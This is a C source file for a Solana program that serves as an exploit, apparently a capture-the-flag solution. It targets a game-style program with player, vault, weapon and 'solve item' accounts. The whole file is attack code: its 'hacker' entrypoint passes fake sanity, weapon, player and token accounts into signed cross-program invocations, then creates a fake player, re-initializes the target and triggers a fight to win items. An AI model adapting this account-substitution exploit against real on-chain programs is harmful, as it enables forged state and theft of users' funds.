#include <solana_sdk.h>

typedef struct
{
  uint8_t vault_seed;
  uint8_t authority_seed;
  uint8_t player_seed;
  uint8_t solve_item_seed;
  uint8_t solve_item_1337_seed;
  uint8_t name[31];
} CreatePlayerInstr;

typedef struct
{
  uint8_t vault_seed;
  uint8_t authority_seed;
  uint8_t amount;
} BuyInstr;

typedef struct
{
  uint8_t vault_seed;
  uint8_t authority_seed;
  uint8_t amount;
} SellInstr;

typedef struct
{
  uint8_t vault_seed;
  uint8_t number;
  uint8_t monster;
} FightInstr;

typedef struct
{
  uint8_t health;
  uint8_t mana;
  char name[30];
} Player;

#define CLOCK 0
#define SYSTEM 1
#define SPL_TOKEN 2
#define ITEM_MINT 3
#define SOLVE_ITEM 4
#define ITEM1337_MINT 5
#define SOLVE_ITEM1337 6
#define AUTHORITY 7
#define USER 8
#define SANITY 9
#define RENT 10
#define PLAYER 11
#define VAULT 12
#define TARGET 13
#define WEAPONS 14
#define ITEM 15
#define ITEM1337 16
#define FAKE_ITEM 17
#define FAKE_ITEM1337 18
#define FAKE_WEAPON 19
#define FAKE_SANITY 20
#define FAKE_TOKEN 21
#define FAKE_PLAYER 22
#define FAKE_TOKEN1 23
#define FAKE_TOKEN2 24
#define ACCOUNT_CNT 25

uint64_t initialize(SolParameters *params)
{
  sol_log("[+] About to initialize !");
  SolAccountMeta meta[] = {
      {.pubkey = params->ka[CLOCK].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[SYSTEM].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[SPL_TOKEN].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[ITEM_MINT].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[FAKE_TOKEN1].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[ITEM1337_MINT].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[FAKE_TOKEN2].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[AUTHORITY].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[USER].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[FAKE_SANITY].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[FAKE_WEAPON].key, .is_writable = true, .is_signer = true},
  };
  uint8_t buf[4 + 5 + 8] = {0};
  buf[0] = 0;
  buf[4] = params->data[1];
  buf[5] = params->data[12];
  buf[6] = params->data[13];

  const SolInstruction instruction = {params->ka[TARGET].key,
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf, SOL_ARRAY_SIZE(buf)};

  uint8_t seed1[] = {'6', 'x'};
  seed1[1] = params->data[9];
  uint8_t seed2[] = {'7', 'x'};
  seed2[1] = params->data[10];
  uint8_t seed3[] = {'3', 'x'};
  seed3[1] = params->data[7];
  uint8_t seed4[] = {'4', 'x'};
  seed4[1] = params->data[11];
  const SolSignerSeed seeds1[] = {{.addr = seed1, .len = SOL_ARRAY_SIZE(seed1)}};
  const SolSignerSeed seeds2[] = {{.addr = seed2, .len = SOL_ARRAY_SIZE(seed2)}};
  const SolSignerSeed seeds3[] = {{.addr = seed3, .len = SOL_ARRAY_SIZE(seed3)}};
  const SolSignerSeed seeds4[] = {{.addr = seed4, .len = SOL_ARRAY_SIZE(seed4)}};
  const SolSignerSeeds signers_seeds[] = {
    {.addr = seeds1, .len = SOL_ARRAY_SIZE(seeds1)},
    {.addr = seeds2, .len = SOL_ARRAY_SIZE(seeds2)},
    {.addr = seeds3, .len = SOL_ARRAY_SIZE(seeds3)},
    {.addr = seeds4, .len = SOL_ARRAY_SIZE(seeds4)},
  };

  sol_invoke_signed(&instruction, params->ka, params->ka_num, signers_seeds, SOL_ARRAY_SIZE(signers_seeds));

  sol_log("[+] finished initialize !");
  return SUCCESS;
}

uint64_t create_fake_player(SolParameters *params)
{
  sol_log("[+] About to create_fake_player !");

  SolAccountMeta meta[] = {
      {.pubkey = params->ka[CLOCK].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[SYSTEM].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[SPL_TOKEN].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[ITEM_MINT].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[FAKE_TOKEN1].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[ITEM1337_MINT].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[FAKE_TOKEN2].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[AUTHORITY].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[USER].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[SANITY].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[RENT].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[FAKE_PLAYER].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[VAULT].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[WEAPONS].key, .is_writable = false, .is_signer = false},
  };

  uint8_t buf[4 + 5 + 8] = {0};
  buf[0] = 3;
  CreatePlayerInstr *p = (CreatePlayerInstr *)((uint8_t *)buf + 4);

  p->vault_seed = params->data[0];
  p->authority_seed = params->data[1];
  p->player_seed = params->data[2];
  p->solve_item_seed = params->data[3];
  p->solve_item_1337_seed = params->data[4];
  sol_memcpy(&p->name, "ainevsia", 8);

  const SolInstruction instruction = {params->ka[TARGET].key,
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf, SOL_ARRAY_SIZE(buf)};
  uint8_t seed1[] = {'6', 'x'};
  seed1[1] = params->data[9];
  uint8_t seed2[] = {'7', 'x'};
  seed2[1] = params->data[10];
  uint8_t seed3[] = {'5', 'x'};
  seed3[1] = params->data[8];
  const SolSignerSeed seeds1[] = {{.addr = seed1, .len = SOL_ARRAY_SIZE(seed1)}};
  const SolSignerSeed seeds2[] = {{.addr = seed2, .len = SOL_ARRAY_SIZE(seed2)}};
  const SolSignerSeed seeds3[] = {{.addr = seed3, .len = SOL_ARRAY_SIZE(seed3)}};
  const SolSignerSeeds signers_seeds[] = {
    {.addr = seeds1, .len = SOL_ARRAY_SIZE(seeds1)},
    {.addr = seeds2, .len = SOL_ARRAY_SIZE(seeds2)},
    {.addr = seeds3, .len = SOL_ARRAY_SIZE(seeds3)},
  };

  sol_invoke_signed(&instruction, params->ka, params->ka_num, signers_seeds, SOL_ARRAY_SIZE(signers_seeds));

  sol_log("[+] finished create_fake_player !");
  return SUCCESS;
}

uint64_t fight(SolParameters *params)
{
  sol_log("[+] About to fight !");

  SolAccountMeta meta[] = {
      {.pubkey = params->ka[CLOCK].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[SYSTEM].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[SPL_TOKEN].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[FAKE_TOKEN2].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[AUTHORITY].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[USER].key, .is_writable = true, .is_signer = true},
      {.pubkey = params->ka[SANITY].key, .is_writable = false, .is_signer = false},
      {.pubkey = params->ka[VAULT].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[FAKE_PLAYER].key, .is_writable = true, .is_signer = false},
      {.pubkey = params->ka[WEAPONS].key, .is_writable = false, .is_signer = false},
  };

  uint8_t buf[4 + 3] = {0};
  buf[0] = 4;
  FightInstr *p = (FightInstr *)((uint8_t *)buf + 4);

  p->vault_seed = params->data[0];
  p->number = 1;
  p->monster = 8;

  const SolInstruction instruction = {params->ka[TARGET].key,
                                      meta, SOL_ARRAY_SIZE(meta),
                                      buf, SOL_ARRAY_SIZE(buf)};

  sol_invoke(&instruction, params->ka, params->ka_num);
  sol_log("[+] finished fight !");
  return SUCCESS;
}

uint64_t hacker(SolParameters *params)
{
  sol_assert(params->ka_num == ACCOUNT_CNT);
  sol_log("[+] About to pwn !");
  create_fake_player(params);
  initialize(params);
  fight(params);
  sol_log("[+] pwned !");
  return SUCCESS;
}

extern uint64_t entrypoint(const uint8_t *input)
{
  sol_log("[+] Hacker start");

  SolAccountInfo accounts[ACCOUNT_CNT];
  SolParameters params = (SolParameters){.ka = accounts};

  if (!sol_deserialize(input, &params, SOL_ARRAY_SIZE(accounts)))
  {
    return ERROR_INVALID_ARGUMENT;
  }

  return hacker(&params);
}
